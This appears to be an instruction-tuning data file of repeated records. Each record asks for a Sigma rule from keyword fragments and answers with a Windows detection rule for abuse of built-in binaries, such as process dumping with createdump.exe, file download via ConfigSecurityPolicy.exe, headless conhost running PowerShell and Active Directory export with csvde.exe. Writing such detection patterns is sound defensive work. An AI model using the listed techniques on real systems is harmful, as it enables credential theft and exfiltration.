{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\csrss.exe \\ctfmon.exe \\dllhost.exe \\epad.exe \\FlashPlayerUpdateService.exe \\GoogleUpdate.exe \\jucheck.exe \\jusched.exe \\LogonUI.exe \\lsass.exe \\regsvr32.exe \\SearchIndexer.exe \\SearchProtocolHost.exe \\SIHClient.exe \\sihost.exe \\slui.exe \\spoolsv.exe \\sppsvc.exe \\taskhostw.exe \\unsecapp.exe \\WerFault.exe \\wermgr.exe \\wlanext.exe \\WUDFHost.exe", "output": "title: Unusual Parent Process For Cmd.EXE\nid: 4b991083-3d0e-44ce-8fc4-b254025d8d4b\nstatus: test\ndescription: Detects suspicious parent process for cmd.exe\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-parent-process-for-cmd.exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-21\nmodified: 2023-12-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\ctfmon.exe'\n            - '\\dllhost.exe'\n            - '\\epad.exe'\n            - '\\FlashPlayerUpdateService.exe'\n            - '\\GoogleUpdate.exe'\n            - '\\jucheck.exe'\n            - '\\jusched.exe'\n            - '\\LogonUI.exe'\n            - '\\lsass.exe'\n            - '\\regsvr32.exe'\n            - '\\SearchIndexer.exe'\n            - '\\SearchProtocolHost.exe'\n            - '\\SIHClient.exe'\n            - '\\sihost.exe'\n            - '\\slui.exe'\n            - '\\spoolsv.exe'\n            - '\\sppsvc.exe'\n            - '\\taskhostw.exe'\n            - '\\unsecapp.exe'\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\wlanext.exe'\n            - '\\WUDFHost.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ConfigSecurityPolicy.exe \\ConfigSecurityPolicy.exe ConfigSecurityPolicy.exe ftp:// http:// https://", "output": "title: Arbitrary File Download Via ConfigSecurityPolicy.EXE\nid: 1f0f6176-6482-4027-b151-00071af39d7e\nstatus: test\ndescription: |\n    Detects the execution of \"ConfigSecurityPolicy.EXE\", a binary part of Windows Defender used to manage settings in Windows Defender.\n    Users can configure different pilot collections for each of the co-management workloads.\n    It can be abused by attackers in order to upload or download files.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - CommandLine|contains: ConfigSecurityPolicy.exe\n        - Image|endswith: '\\ConfigSecurityPolicy.exe'\n        - OriginalFileName: 'ConfigSecurityPolicy.exe'\n    selection_url:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ConfigSecurityPolicy.exe \\ConfigSecurityPolicy.exe ConfigSecurityPolicy.exe ftp:// \\\"http://\\\" \\\"https://\\\"", "output": "title: Arbitrary File Download Via ConfigSecurityPolicy.EXE\nid: 1f0f6176-6482-4027-b151-00071af39d7e\nstatus: test\ndescription: |\n    Detects the execution of \"ConfigSecurityPolicy.EXE\", a binary part of Windows Defender used to manage settings in Windows Defender.\n    Users can configure different pilot collections for each of the co-management workloads.\n    It can be abused by attackers in order to upload or download files.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - CommandLine|contains: ConfigSecurityPolicy.exe\n        - Image|endswith: '\\ConfigSecurityPolicy.exe'\n        - OriginalFileName: 'ConfigSecurityPolicy.exe'\n    selection_url:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ConfigSecurityPolicy \\ConfigSecurityPolicy ConfigSecurityPolicy ftp:// http:// https://", "output": "title: Arbitrary File Download Via ConfigSecurityPolicy.EXE\nid: 1f0f6176-6482-4027-b151-00071af39d7e\nstatus: test\ndescription: |\n    Detects the execution of \"ConfigSecurityPolicy.EXE\", a binary part of Windows Defender used to manage settings in Windows Defender.\n    Users can configure different pilot collections for each of the co-management workloads.\n    It can be abused by attackers in order to upload or download files.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - CommandLine|contains: ConfigSecurityPolicy.exe\n        - Image|endswith: '\\ConfigSecurityPolicy.exe'\n        - OriginalFileName: 'ConfigSecurityPolicy.exe'\n    selection_url:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ConfigSecurityPolicy.exe ConfigSecurityPolicy.exe http:// ftp:// \\ConfigSecurityPolicy.exe https://", "output": "title: Arbitrary File Download Via ConfigSecurityPolicy.EXE\nid: 1f0f6176-6482-4027-b151-00071af39d7e\nstatus: test\ndescription: |\n    Detects the execution of \"ConfigSecurityPolicy.EXE\", a binary part of Windows Defender used to manage settings in Windows Defender.\n    Users can configure different pilot collections for each of the co-management workloads.\n    It can be abused by attackers in order to upload or download files.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - CommandLine|contains: ConfigSecurityPolicy.exe\n        - Image|endswith: '\\ConfigSecurityPolicy.exe'\n        - OriginalFileName: 'ConfigSecurityPolicy.exe'\n    selection_url:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\conhost.exe CONHOST.EXE --headless powershell", "output": "title: Powershell Executed From Headless ConHost Process\nid: 056c7317-9a09-4bd4-9067-d051312752ea\nrelated:\n    - id: 00ca75ab-d5ce-43be-b86c-55ff39c6abfc\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of powershell commands from headless ConHost window.\n    The \"--headless\" flag hides the windows from the user upon execution.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '--headless'\n            - 'powershell'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\conhost.exe CONHOST.EXE \\\"--headless\\\" powershell", "output": "title: Powershell Executed From Headless ConHost Process\nid: 056c7317-9a09-4bd4-9067-d051312752ea\nrelated:\n    - id: 00ca75ab-d5ce-43be-b86c-55ff39c6abfc\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of powershell commands from headless ConHost window.\n    The \"--headless\" flag hides the windows from the user upon execution.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '--headless'\n            - 'powershell'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\conhost CONHOST --headless powershell", "output": "title: Powershell Executed From Headless ConHost Process\nid: 056c7317-9a09-4bd4-9067-d051312752ea\nrelated:\n    - id: 00ca75ab-d5ce-43be-b86c-55ff39c6abfc\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of powershell commands from headless ConHost window.\n    The \"--headless\" flag hides the windows from the user upon execution.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '--headless'\n            - 'powershell'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\conhost.exe --headless powershell CONHOST.EXE", "output": "title: Powershell Executed From Headless ConHost Process\nid: 056c7317-9a09-4bd4-9067-d051312752ea\nrelated:\n    - id: 00ca75ab-d5ce-43be-b86c-55ff39c6abfc\n      type: derived\nstatus: test\ndescription: |\n    Detects the use of powershell commands from headless ConHost window.\n    The \"--headless\" flag hides the windows from the user upon execution.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '--headless'\n            - 'powershell'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "conhost.exe 0xffffffff -ForceV1", "output": "title: Suspicious High IntegrityLevel Conhost Legacy Option\nid: 3037d961-21e9-4732-b27a-637bcc7bf539\nstatus: test\ndescription: ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.\nreferences:\n    - https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control\nauthor: frack113\ndate: 2022-12-09\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational"}
{"instruction": "Write Sigma rule to detect payload:", "input": "conhost.exe \\\"0xffffffff\\\" -ForceV1", "output": "title: Suspicious High IntegrityLevel Conhost Legacy Option\nid: 3037d961-21e9-4732-b27a-637bcc7bf539\nstatus: test\ndescription: ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.\nreferences:\n    - https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control\nauthor: frack113\ndate: 2022-12-09\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational"}
{"instruction": "Write Sigma rule to detect payload:", "input": "conhost 0xffffffff -ForceV1", "output": "title: Suspicious High IntegrityLevel Conhost Legacy Option\nid: 3037d961-21e9-4732-b27a-637bcc7bf539\nstatus: test\ndescription: ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.\nreferences:\n    - https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control\nauthor: frack113\ndate: 2022-12-09\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational"}
{"instruction": "Write Sigma rule to detect payload:", "input": "conhost.exe -ForceV1 0xffffffff", "output": "title: Suspicious High IntegrityLevel Conhost Legacy Option\nid: 3037d961-21e9-4732-b27a-637bcc7bf539\nstatus: test\ndescription: ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.\nreferences:\n    - https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control\nauthor: frack113\ndate: 2022-12-09\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational"}
{"instruction": "Write Sigma rule to detect payload:", "input": "conhost /../../", "output": "title: Conhost.exe CommandLine Path Traversal\nid: ee5e119b-1f75-4b34-add8-3be976961e39\nstatus: test\ndescription: detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking\nreferences:\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-14\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentCommandLine|contains: 'conhost'\n        CommandLine|contains: '/../../'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "conhost /../../", "output": "title: Conhost.exe CommandLine Path Traversal\nid: ee5e119b-1f75-4b34-add8-3be976961e39\nstatus: test\ndescription: detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking\nreferences:\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-14\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentCommandLine|contains: 'conhost'\n        CommandLine|contains: '/../../'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\createdump.exe FX_VER_INTERNALNAME_STR -u --full -f --name .dmp", "output": "title: CreateDump Process Dump\nid: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48\nrelated:\n    - id: 1a1ed54a-2ba4-4221-94d5-01dee560d71e\n      type: similar\nstatus: test\ndescription: Detects uses of the createdump.exe LOLOBIN utility to dump process memory\nreferences:\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://twitter.com/bopin2020/status/1366400799199272960\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-04\nmodified: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\createdump.exe'\n        - OriginalFileName: 'FX_VER_INTERNALNAME_STR'\n    selection_cli:\n        CommandLine|contains:\n            - ' -u ' # Short version of '--full'\n            - ' --full '\n            - ' -f ' # Short version of '--name'\n            - ' --name '\n            - '.dmp '\n    condition: all of selection_*\nfalsepositives:\n    - Command lines that use the same flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\createdump.exe \\\"F\\\"\\\"X\\\"\\\"_\\\"\\\"V\\\"\\\"E\\\"\\\"R\\\"\\\"_\\\"\\\"I\\\"\\\"N\\\"\\\"T\\\"\\\"E\\\"\\\"R\\\"\\\"N\\\"\\\"A\\\"\\\"L\\\"\\\"N\\\"\\\"A\\\"\\\"M\\\"\\\"E\\\"\\\"_\\\"\\\"S\\\"\\\"T\\\"\\\"R\\\" -u --full -f --name .dmp", "output": "title: CreateDump Process Dump\nid: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48\nrelated:\n    - id: 1a1ed54a-2ba4-4221-94d5-01dee560d71e\n      type: similar\nstatus: test\ndescription: Detects uses of the createdump.exe LOLOBIN utility to dump process memory\nreferences:\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://twitter.com/bopin2020/status/1366400799199272960\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-04\nmodified: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\createdump.exe'\n        - OriginalFileName: 'FX_VER_INTERNALNAME_STR'\n    selection_cli:\n        CommandLine|contains:\n            - ' -u ' # Short version of '--full'\n            - ' --full '\n            - ' -f ' # Short version of '--name'\n            - ' --name '\n            - '.dmp '\n    condition: all of selection_*\nfalsepositives:\n    - Command lines that use the same flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\createdump FX_VER_INTERNALNAME_STR -u --full -f --name .dmp", "output": "title: CreateDump Process Dump\nid: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48\nrelated:\n    - id: 1a1ed54a-2ba4-4221-94d5-01dee560d71e\n      type: similar\nstatus: test\ndescription: Detects uses of the createdump.exe LOLOBIN utility to dump process memory\nreferences:\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://twitter.com/bopin2020/status/1366400799199272960\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-04\nmodified: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\createdump.exe'\n        - OriginalFileName: 'FX_VER_INTERNALNAME_STR'\n    selection_cli:\n        CommandLine|contains:\n            - ' -u ' # Short version of '--full'\n            - ' --full '\n            - ' -f ' # Short version of '--name'\n            - ' --name '\n            - '.dmp '\n    condition: all of selection_*\nfalsepositives:\n    - Command lines that use the same flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\createdump.exe FX_VER_INTERNALNAME_STR -u --full -f --name .dmp", "output": "title: CreateDump Process Dump\nid: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48\nrelated:\n    - id: 1a1ed54a-2ba4-4221-94d5-01dee560d71e\n      type: similar\nstatus: test\ndescription: Detects uses of the createdump.exe LOLOBIN utility to dump process memory\nreferences:\n    - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n    - https://twitter.com/bopin2020/status/1366400799199272960\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-04\nmodified: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\createdump.exe'\n        - OriginalFileName: 'FX_VER_INTERNALNAME_STR'\n    selection_cli:\n        CommandLine|contains:\n            - ' -u ' # Short version of '--full'\n            - ' --full '\n            - ' -f ' # Short version of '--name'\n            - ' --name '\n            - '.dmp '\n    condition: all of selection_*\nfalsepositives:\n    - Command lines that use the same flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csi.exe \\powershell.exe \\pwsh.exe \\powershell_ise.exe csi.exe", "output": "title: Suspicious Use of CSharp Interactive Console\nid: a9e416a8-e613-4f8b-88b8-a7d1d1af2f61\nstatus: test\ndescription: Detects the execution of CSharp interactive console by PowerShell\nreferences:\n    - https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/\nauthor: Michael R. (@nahamike01)\ndate: 2020-03-08\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csi.exe'\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\powershell_ise.exe'\n        OriginalFileName: 'csi.exe'\n    condition: selection\nfalsepositives:\n    - Possible depending on environment. Pair with other factors such as net connections, command-line args, etc.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csi.exe \\powershell.exe \\pwsh.exe \\\"p\"\"o\"\"w\"\"e\"\"r\"\"s\"\"h\"\"e\"\"l\"\"l\"\"_\"\"i\"\"s\"\"e\"\".\"\"e\"\"x\"\"e\" csi.exe", "output": "title: Suspicious Use of CSharp Interactive Console\nid: a9e416a8-e613-4f8b-88b8-a7d1d1af2f61\nstatus: test\ndescription: Detects the execution of CSharp interactive console by PowerShell\nreferences:\n    - https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/\nauthor: Michael R. (@nahamike01)\ndate: 2020-03-08\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csi.exe'\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\powershell_ise.exe'\n        OriginalFileName: 'csi.exe'\n    condition: selection\nfalsepositives:\n    - Possible depending on environment. Pair with other factors such as net connections, command-line args, etc.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csi \\powershell \\pwsh \\powershell_ise csi", "output": "title: Suspicious Use of CSharp Interactive Console\nid: a9e416a8-e613-4f8b-88b8-a7d1d1af2f61\nstatus: test\ndescription: Detects the execution of CSharp interactive console by PowerShell\nreferences:\n    - https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/\nauthor: Michael R. (@nahamike01)\ndate: 2020-03-08\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csi.exe'\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\powershell_ise.exe'\n        OriginalFileName: 'csi.exe'\n    condition: selection\nfalsepositives:\n    - Possible depending on environment. Pair with other factors such as net connections, command-line args, etc.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csi.exe \\powershell.exe \\powershell_ise.exe \\pwsh.exe csi.exe", "output": "title: Suspicious Use of CSharp Interactive Console\nid: a9e416a8-e613-4f8b-88b8-a7d1d1af2f61\nstatus: test\ndescription: Detects the execution of CSharp interactive console by PowerShell\nreferences:\n    - https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/\nauthor: Michael R. (@nahamike01)\ndate: 2020-03-08\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csi.exe'\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\powershell_ise.exe'\n        OriginalFileName: 'csi.exe'\n    condition: selection\nfalsepositives:\n    - Possible depending on environment. Pair with other factors such as net connections, command-line args, etc.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csvde.exe csvde.exe -f -i", "output": "title: Active Directory Structure Export Via Csvde.EXE\nid: e5d36acd-acb4-4c6f-a13f-9eb203d50099\nstatus: test\ndescription: Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms\n    - https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://redcanary.com/blog/msix-installers/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\csvde.exe'\n        - OriginalFileName: 'csvde.exe'\n    selection_remote:\n        CommandLine|contains: ' -f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csvde.exe \"csvde.exe\" \"-f\" -i", "output": "title: Active Directory Structure Export Via Csvde.EXE\nid: e5d36acd-acb4-4c6f-a13f-9eb203d50099\nstatus: test\ndescription: Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms\n    - https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://redcanary.com/blog/msix-installers/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\csvde.exe'\n        - OriginalFileName: 'csvde.exe'\n    selection_remote:\n        CommandLine|contains: ' -f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\csvde csvde -f -i", "output": "title: Active Directory Structure Export Via Csvde.EXE\nid: e5d36acd-acb4-4c6f-a13f-9eb203d50099\nstatus: test\ndescription: Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms\n    - https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://redcanary.com/blog/msix-installers/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\csvde.exe'\n        - OriginalFileName: 'csvde.exe'\n    selection_remote:\n        CommandLine|contains: ' -f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
